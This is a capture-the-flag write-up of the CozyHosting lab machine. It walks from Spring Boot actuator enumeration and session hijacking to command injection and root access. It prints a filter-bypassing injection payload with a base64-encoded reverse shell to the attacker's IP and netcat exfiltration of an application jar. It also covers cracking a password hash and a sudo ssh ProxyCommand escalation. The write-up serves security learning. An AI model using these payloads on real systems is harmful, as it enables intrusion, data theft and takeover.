CozyHosting

Target IP: 10.129.31.35
Challenge Description: N/A.

Reconnaissance


Performing a port scan using the command sudo nmap -sS 10.129.31.35 -p- shows there are two TCP ports open on the target machine: SSH and HTTP on their standard ports, as shown above. Time to perform an aggressive scan against these two ports.


Running the command sudo nmap -sV -A 10.129.31.35 -p 22,80 returns the result above. The scanned result for HTTP is interesting as the domain name cozyhosting.htb is returned to me.


Time to add this hostname inside my /etc/hosts file and perform further reconnaissance. After adding the hostname inside my /etc/hosts file, the result above is shown. Time to check the website!

Enumeration

Port 80: HTTP

Browsing to http://cozyhosting.htb returns the webpage shown above. Right away, I notice there is a login feature. I viewed the source-code of this webpage, but I did not find anything useful. Time to perform a directory search.


Performing a directory search using the command gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt returns the interesting result above. The entry /error is the most interesting to me, as it contains an error webpage. Maybe I can find out more information about the backend from this page?


Browsing to http://cozyhosting.htb/error returns the result above. Doing a Google search for Whitelabel error page shows this error is related to Spring Boot Java framework. Now I can perform further directory search using a Spring Boot wordlist.


Running the command gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt to identify the Spring Boot endpoints returns the result above. Now I can find more information about the backend application and the host by visiting the different entries from above. The mapping /actuator is interesting to me.


Browsing to http://cozyhosting.htb/actuator returns the webpage above. There is another mapping called /sessions. Maybe we can obtain more information, such as possible user session data?


And bingo! There is a username called kanderson. The endpoint /actuator/sessions seems to leak this user session. The session ID is also located there, so maybe I can access the web application as this new user?


Checking the different endpoints at /actuator/mappings returns the interesting entry shown above. There is an endpoint with the name /executessh.


Since I already have the session ID of the user kanderson. I replaced the default JSESSIONID with the one I found at /actuator/sessions belonging to kanderson, as shown above. From previous enumeration, maybe this user is the admin user? What features of the web application can I access as this user? Time to find out.


After making the changes to JSESSIONID, I refreshed my browser and got a hit! Now I have access to the web application as kanderson, as shown above. I browsed to /admin page and found more interesting information.


By the looks of it, it is possible to use SSH to access the target machine. There are two interesting parameters here: hostname and username, as shown above.


What? Fuzzing the two parameters to identify any error pages returned the crucial webpage above. I inserted sleep(4); for the username parameter and got a hit shown above. The error /bin/bash: -c: line 1: syntax error near unexpected token `('/bin/bash: -c: line 1: `ssh -o ConnectTimeout=1 sleep(4);@127.0.0.1' was returned to me. And it looks like the web application is performing command execution via bash, but it is using ssh -o as the prefix. Maybe I can perform RCE if I bypass the filtering in place?

Exploitation


After many tries, I managed to bypass the filtering in place by using the payload ;`echo${IFS};whoami to obtain the user app that is running the web application by using the command whoami, as shown above. Time to obtain a reverse shell connection now. Since spaces are detected by the filter, I used ${IFS} as the space to bypass the filter. I will need to use a base64 encoded reverse shell too.


I started a listener on my machine at port 8443. Then I sent the payload ;`echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjMzLzg0NDMgMD4mMQ==${IFS}|base64${IFS}-d${IFS}|bash using Burpsuite. Then I instantly got a hit and a reverse shell connection from the target machine on my machine at port 8443 with the session as app, as shown above. Now I have a foothold on the target machine, via a command injection attack.

Privilege Escalation


The jar file with the name cloudhosting-0.0.1.jar is located at /app. Time to transfer this file to my machine to identify any useful information. On the target machine, I ran the command nc -w 3 10.10.14.33 1234 < cloudhosting-0.0.1.jar. And on my machine, I executed the command nc -l -p 1234 > cloudhosting-0.0.1.jar to receive the file, as shown above.


After extracting the jar files. I wanted to look at application.properties to identify any credentials. And bingo! I managed to identify the username and password of the postgres application, as shown above. Now I have the credentials postgres:Vg&nvzAQ7XxR. Time to access the database to find any credentials.


I stabilised my shell using the command python3 -c 'import pty; pty.spawn("/bin/bash");' first. Then I entered the command psql -h localhost -U postgres and the password Vg&nvzAQ7XxR to gain access to the database application, as shown above.


I changed to the database cozyhosting by running the command \c cozyhosting. Then I executed the command \d to list the databases. There is an interesting database with the name users, as shown above.


Running the command select * from users returns the result above. I have the usernames kanderson and admin, and their password hashes. I copied the two password hashes to a file called hash on my machine. Time to crack these hashes.


I cracked one password hash using john and the command john hash --wordlist=/usr/share/wordlists/rockyou.txt, as shown above. Now I have the password manchesterunited. From previous enumeration, there is a user called josh on the target machine. Maybe I can fire this password and try to login as this user?


Using the command su josh and the new password, I managed to escalate my privileges horizontally to the user josh as shown above.


Running the command sudo -l shows the entry (root) /usr/bin/ssh * can be executed as the user root. This privilege escalation vector can be used to spawn a root shell.


I ran the command sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x to spawn a root shell, as shown above. GG. Now I have root access on the target machine :)
